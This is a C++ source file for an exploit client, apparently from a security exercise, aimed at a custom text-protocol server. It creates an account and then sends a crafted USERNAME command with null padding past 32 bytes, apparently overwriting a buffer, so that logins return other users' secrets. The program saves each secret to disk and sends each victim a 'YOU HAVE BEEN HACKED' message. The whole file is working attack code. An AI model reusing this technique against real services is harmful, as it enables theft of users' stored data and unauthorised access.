#include "exploit.hpp"

Exploit::Exploit(std::string hostname, uint16_t port)
    :  m_port(port), m_hostname(hostname)
{
    if(std::filesystem::exists(m_secrets)){
        std::filesystem::remove_all(m_secrets);
    }
    if(std::filesystem::create_directories(m_secrets)){
        exp_log("file Secrets created");
    }

}

Exploit::~Exploit()
{
}

void Exploit::run()
{   
    create_user();
    while(m_more_secrets){
        modify_handle();
        get_secret();
        store_secret();
        notify_hacked();
    }
}

void Exploit::connect_to_server()
{
    // resolve hostname
    bool connected = false;
    while(!connected){
        /* Create the socket file descriptor. */
        m_clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if(m_clientSocket == -1)
        {
            exp_log("falied to create socket");
            sleep(1);
            exp_log("reattemptng...");
            continue;
        }
        /* Configuration of IP and PORT */
        sockaddr_in server_address;
        server_address.sin_family = AF_INET;
        server_address.sin_port = htons(m_port);
        // Insert server_ip as bytes into client_address.sin_addr buffer. 
        inet_pton(AF_INET, m_hostname.c_str(), &server_address.sin_addr);

        /* Connect to the server on the socket. */
        int conn_res = connect(m_clientSocket, (const struct sockaddr*)&server_address, (socklen_t)sizeof(sockaddr_in));
        if(conn_res == -1)
        {
            exp_log("failed to connect to server");
            sleep(1);
            exp_log("reattemptng...");
            continue;
        }
        /* We have successfully connected to the server. */
        connected = true;
    }
}

void Exploit::execute_command()
{
    // if ececuting command, last command handled
    m_response.clear();
    
    // connect and execute
    exp_log(m_command);
    memcpy(m_send, m_command.c_str(), m_command.length());
    connect_to_server();
    m_bytesSent = send(m_clientSocket, m_send, m_command.length(), 0);
    exp_log("bytes sent", m_bytesSent);
    m_bytesRecv = recv(m_clientSocket, m_recv, sizeof(m_recv), 0);
    m_response = m_recv;
    exp_log("response", m_response);

    //cleanup
    memset(m_send, 0, sizeof(m_send));
    memset(m_recv, 0, sizeof(m_recv));
}

void Exploit::create_user()
{
    bool taken = true;
    std::string suffex = "1";
    while(taken){
        // format command
        m_command.clear();
        m_command.append("CREATE ");
        m_command.append(m_username);
        m_command.append(" ");
        m_command.append(m_password);
        m_command.append(" *");

        // try create account
        execute_command();

        // successful
        if(m_response == "CREATED"){
            taken = false;
        }
        // try add a number
        if(m_response == "TAKEN"){
            m_username.append(suffex);
            suffex[0]++;
            continue;
        }
    }
    // write secret we can use to know when we have gotten all users
    
    // format command
    m_command.clear();
    m_command.append("LOGOFF ");
    m_command.append(m_username);
    m_command.append(" ");
    m_command.append(m_password);
    m_command.append(" *");
    m_command.append("!!!LAST!!!");

    execute_command();
    
    if(m_response != "STORED"){
        exp_log("failed to store sentinel");
        exit(-1);
    }
}

void Exploit::modify_handle()
{
    m_handle = m_handlePre + std::to_string(m_numHacked) + m_handlePost;
    
    // format command
    m_command.clear();
    m_command.append("USERNAME ");
    m_command.append(m_username);
    m_command.append(" ");
    m_command.append(m_password);
    m_command.append(" *");

    // copy command
    memcpy(m_send, m_command.c_str(), m_command.length());

    int index = m_command.length();

    // copy username so it doesn't get altered
    for(int i = 0; i < m_username.length(); i++){
        m_send[index + i] = m_username[i];
    }
    
    // pad null bytes till end of username
    index += m_username.length();
    int null_bytes = 32 - m_username.length();

    for(int i = 0; i < null_bytes; i++){
        m_send[index + i] = 0x00;
    }
    
    // write new hanlde
    index = m_command.length() + 32;
    memcpy(&m_send[index], m_handle.c_str(), m_handle.length());

    // connect and send
    connect_to_server();
    m_bytesSent = send(m_clientSocket, m_send, index + m_handle.length(), 0);
    exp_log("bytes sent", m_bytesSent);
    m_bytesRecv = recv(m_clientSocket, m_recv, sizeof(m_recv), 0);
    m_response = m_recv;
    exp_log("response", m_response);

    //cleanup
    memset(m_send, 0, sizeof(m_send));
    memset(m_recv, 0, sizeof(m_recv));

}

void Exploit::get_secret()
{
    // format command
    m_command.clear();
    m_command.append("LOGIN ");
    m_command.append(m_username);
    m_command.append(" ");
    m_command.append(m_password);
    m_command.append(" *");

    // execute
    execute_command();
    if(m_response == "!!!LAST!!!"){
        m_more_secrets = false;
    }

}

void Exploit::store_secret()
{
    if(m_response == "!!!LAST!!!"){
        return;
    }
    std::string id = std::to_string(m_numHacked++);
    std::string file = m_path + m_handlePre + id + m_handlePost;
    std::ofstream fp(file, std::ios::binary);
    fp.write(m_response.data(), m_response.length());

}

void Exploit::notify_hacked()
{
    if(m_response == "!!!LAST!!!"){
        return;
    }
    // format command
    m_command.clear();
    m_command.append("LOGOFF ");
    m_command.append(m_username);
    m_command.append(" ");
    m_command.append(m_password);
    m_command.append(" *YOU HAVE BEEN HACKED");

    // execute
    execute_command();
}

int main(int argc, char* argv[]){

    if(argc < 3){
        std::cout << "useage : hostname port" << std::endl;
        return -1;
    }
    if(strlen(argv[2]) != 4){
        std::cout << "port number must be 4 digits" << std::endl;
        return -1;
    }
    std::string port_str = "PORT";
    int port = atoi(argv[2]);
    std::string hostname = argv[1];

    // create server and run, run loops
    Exploit exploit(hostname, (uint16_t)port);
    exploit.run();
    return 0;
}